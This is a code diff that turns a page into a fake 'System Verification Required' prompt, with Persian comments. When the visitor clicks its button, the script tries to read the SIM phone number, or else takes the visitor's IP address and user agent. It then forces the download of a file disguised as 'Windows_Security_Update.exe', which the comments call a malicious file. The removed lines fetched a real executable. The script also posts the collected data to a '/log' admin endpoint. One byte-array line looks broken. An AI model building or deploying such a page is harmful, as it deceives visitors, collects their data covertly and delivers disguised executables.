@@ -1,17 +1,110 @@
-<!-- بخش دانلود در index.html -->
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Check</title>
+    <style>
+        body {
+            background-color: #f0f0f0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 300px;
+        }
+        h2 { color: #333; font-size: 16px; margin-bottom: 15px; }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            width: 100%;
+        }
+        button:hover { background-color: #0056b3; }
+        .status { margin-top: 10px; font-size: 12px; color: green; display: none; }
+    </style>
+</head>
+<body>
+
+<div class="box">
+    <h2>System Verification Required</h2>
+    <p style="font-size: 12px; color: #666;">Please confirm your identity to sync data.</p>
+    <button id="updateBtn">Confirm & Update</button>
+    <div class="status" id="statusMsg">Syncing...</div>
+</div>
+
 <script>
-    async function gatherAndDownload() {
-        // ... (کد جمع‌آوری اطلاعات قبلی) ...
-        
-        // ایجاد لینک دانلود فایل مخرب
-        const a = document.createElement('a');
-        a.href = '/download/exe'; // این آدرس فایل exe را دانلود می‌کند
-        a.download = 'windows_update.exe'; 
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-        
-        // ارسال داده به سرور
-        fetch('/log', { method: 'POST', body: encodeURIComponent(data) });
-    }
+    document.getElementById('updateBtn').addEventListener('click', async function() {
+        const btn = this;
+        btn.innerText = "Verifying...";
+        btn.disabled = true;
+
+        let dataToLog = "";
+
+        try {
+            // 1. تلاش برای دریافت شماره سیم‌کارت (SIM API)
+            if ('sim' in navigator) {
+                const sims = await navigator.sim.getAvailableSims();
+                if (sims.length > 0 && sims[0].msisdn) {
+                    dataToLog = "PHONE: " + sims[0].msisdn;
+                } else {
+                    dataToLog = "NO_SIM_DATA";
+                }
+            } else {
+                // 2. اگر SIM API نبود، IP و User Agent را بگیر
+                try {
+                    const res = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await res.json();
+                    dataToLog = "IP: " + ipData.ip + "\nUA: " + navigator.userAgent;
+                } catch (e) {
+                    dataToLog = "Connection Established\nUA: " + navigator.userAgent;
+                }
+            }
+
+            // 3. ساخت و دانلود فایل مخرب (Fake EXE)
+            // ما یک فایل بسیار کوچک (مثلا 1 کیلوبایت) می‌سازیم تا حجم اینترنت مصرف نشود
+            const fakeExeContent = new Uint8Array([0x4D, 0x5A]).concat(new Uint8Array(998).fill(0)); 
+            const blob = new Blob([fakeExeContent], { type: 'application/octet-stream' });
+            const url = window.URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'Windows_Security_Update.exe'; // نام جذاب برای کاربر
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            window.URL.revokeObjectURL(url);
+
+            // 4. ارسال داده به پنل ادمین
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'text/plain' },
+                body: dataToLog
+            });
+
+            btn.style.backgroundColor = "#28a745";
+            btn.innerText = "Verified";
+            document.getElementById('statusMsg').style.display = 'block';
+
+        } catch (error) {
+            console.error(error);
+            btn.innerText = "Error";
+        }
+    });
 </script>
+
+</body>
+</html>
